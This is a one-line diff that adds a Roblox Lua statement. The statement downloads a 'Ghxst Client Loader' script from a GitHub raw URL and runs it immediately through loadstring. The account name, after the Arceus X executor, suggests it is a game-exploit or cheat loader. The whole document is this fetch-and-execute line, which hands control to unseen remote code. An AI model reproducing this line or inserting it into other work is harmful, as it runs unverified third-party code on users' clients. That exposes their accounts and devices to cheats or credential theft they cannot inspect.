@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXEditsOfficial/Ghxst-Client-Loader-V3.7.5/main/Main/Lua"))()
